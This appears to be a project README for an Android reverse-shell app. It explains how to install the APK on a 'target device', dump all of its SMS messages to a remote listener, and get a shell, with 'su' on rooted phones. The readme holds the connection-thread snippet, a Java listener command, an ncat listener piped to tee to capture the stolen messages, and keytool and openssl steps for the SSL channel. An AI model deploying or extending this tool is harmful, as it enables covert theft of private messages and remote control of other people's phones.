Android Reverse Shell
===================
Ian Cohee 
---------------------

A small, very basic reverse shell for the Android mobile operating system. The code can be compiled into an APK package, that must be installed
on the target device. The application will dump the SMS contents of the device inbox, outbox, and sent mail, then drop into the shell. The resulting shell will be unprivileged, unless the target phone is rooted, then the command "su" can be used. In that case, the user still needs to manually give the application permission to "su" to UID 0. 

Secured vs. Unsecured Shell
--------------------------
By default, the connection is made using SSL encryption, provided by the Listener's keystore. The Certificate for the listener's private key has been imported to the Android application's TrustStore, located in /res/raw/android.truststore.
If you want to create your own SSL keypair, you'll need to import the certificate manually.

Secure

    // UI cannot do networking stuff on its own, it needs
    // a separate thread. 
    new SecureConnectionThread().execute(host, port, "true");


Insecure

    // UI cannot do networking stuff on its own, it needs
    // a separate thread. 
    new SecureConnectionThread().execute(host, port, "false");

Listener (default: secured)
--------
I'm providing a Listener written in Java, that uses a KeyStore containing the private key that the Android Reverse Shell will accept. The BouncyCastle jar needs to be in the classpath of the listener, as well as two command-line arguments: 1) Path to the keystore (also supplied in this repository, under 'Crypto') and 2) the port to listen on (7777 by default).

	java -classpath /path/to/bcprov-jdk15on-146.jar Listener /path/to/javaserver.keystore 7777

Listener (unsecured)
--------
Still working on that (I'll have it when I get SSL or Symmetric key encryption added) in the mean time, a simple netcat-like listener works. I prefer to use Ncat, of the Nmap project. Since the application dumps SMS, I like to pipe them to `tee` to capture the results. The Listener will have logging, when I get to it. 

    ncat 192.168.2.3 7777 | tee server.out

Mini-tutorials
==============

Generating a KeyStore
-----------------------
    keytool -genkey -keystore server.keystore -alias android -storetype BKS -providerpath /path/to/bcprov-jdk15on-146.jar -provider org.bouncycastle.jce.provider.BouncyCastleProvider

Getting Android to accpet the KeyStore (TrustStore)
---------------------------------------------------
Step 1: Export public key from KeyStore into a `.crt` file. In this case the key's alias is 'android' and the resulting certificate will be 'android.crt'

	keytool -export -keystore server.keystore -alias android -file android.crt -storetype BKS -providerpath /path/to/bcprov-jdk15on-146.jar -provider org.bouncycastle.jce.provider.BouncyCastleProvider

Step 2: Import `.crt` in to the Android's TrustStore, under the alias 'android'.

	keytool -import -keystore android.truststore -alias android -file android.crt -storetype BKS -providerpath /path/to/bcprov-jdk15on-146.jar -provider org.bouncycastle.jce.provider.BouncyCastleProvider	

Generating X509 Certificate (untested)
--------------------------------------
This file will contain the both the private key, and the certificate into a file called `cert.pem`. It might be possible to use `ncat` with this cert, but I had issues keeping the connection alive using `ncat` as the listener. The preferred method should be to use the AndroidRSListener, written in Java. 
    
    openssl req -newkey rsa:2048 -nodes -days 3650 -x509 -keyout cert.pem -out cert.pem

Then extract the everything between the `-----BEGIN_CERTIFICATE-----` and `-----END_CERTIFICATE-----` (inclusively) into a new file. Now This file needs to be added to the trust store that the application uses. 

Importing Certificate into TrustStore
-------------------------------------
    keytool -importcert -trustcacerts -keystore android.truststore -file cert.pem -storetype BKS -providerpath /path/to/bcprov-jdk15on-146.jar -provider org.bouncycastle.jce.provider.BouncyCastleProvider 

Adding Bouncy Castle to java.security File, statically
------------------------------------------------------
Locate the correct security file, mine was a symlink in /usr

    locate java.security

Add an entry, where X is the next ordinal number to the java.security file
    
    security.provider.X=org.bouncycastle.jce.provider.BouncyCastleProvider
